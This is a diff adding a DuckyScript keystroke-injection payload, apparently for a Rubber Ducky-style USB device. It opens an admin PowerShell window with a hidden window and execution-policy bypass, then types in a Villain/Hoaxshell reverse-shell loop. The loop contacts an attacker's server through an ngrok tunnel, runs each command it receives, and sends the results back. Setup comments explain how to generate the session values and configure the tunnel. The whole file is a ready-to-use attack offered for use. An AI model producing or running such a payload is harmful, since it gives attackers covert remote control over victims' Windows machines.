@@ -1,0 +1,42 @@
+REM Villain Shell via NGROK
+REM HackingMark
+REM DESCRIPTION This Script spawns a Admin Powershellwindow  and executes the Villain Payload throug an NGROK Tunnel in the Background(Win10)/minimized(Win11)
+
+REM Villain Hoaxshell by T3l3machus on Github: https://github.com/t3l3machus/Villain 
+REM What to do before: Start Villain.py on your System and create a Payload (generate os=windows lhost=0.0.0.0 lport=8080) to get the $i value
+REM take the generated Value from $i and paste it in line 11-13
+REM Start Ngrok Tunnel (ngrok http 8080)
+REM Put your NGROK HTTPS Link here
+DEFINE #NGROK Example.com
+REM Split your Sessionnumber into 3 parts eg $i='4ba4f358-322d5df5-f4516c91'
+DEFINE #SN1 4ba4f358
+DEFINE #SN2 322d5df5
+DEFINE #SN3 f4516c91
+
+
+DELAY 2000
+GUI x
+DELAY 200
+STRING a
+DELAY 500
+ALT j
+REM The Part above needs to be adapted to your language, code is for German System Layouts
+DELAY 1000
+STRING powershell -w h -NoP -NonI -ep Bypass -C {$s='
+STRING #NGROK
+STRING ';$i='
+STRING #SN1
+STRING -
+STRING #SN2
+STRING -
+STRING #SN3
+STRING ';$p='h'+'ttps://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/
+STRING #SN1
+STRING /$env:COMPUTERNAME/$env:USERNAME -Headers @{"Authorization"=$i;"ngrok-skip-browser-warning"="asd"};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/
+STRING #SN2
+SPACE
+STRING -Headers @{"Authorization"=$i;"ngrok-skip-browser-warning"="asd"});if ($c -ne 'None') {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/
+STRING #SN3
+SPACE
+STRING -Method POST -Headers @{"Authorization"=$i;"ngrok-skip-browser-warning"="asd"} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}}
+ENTER
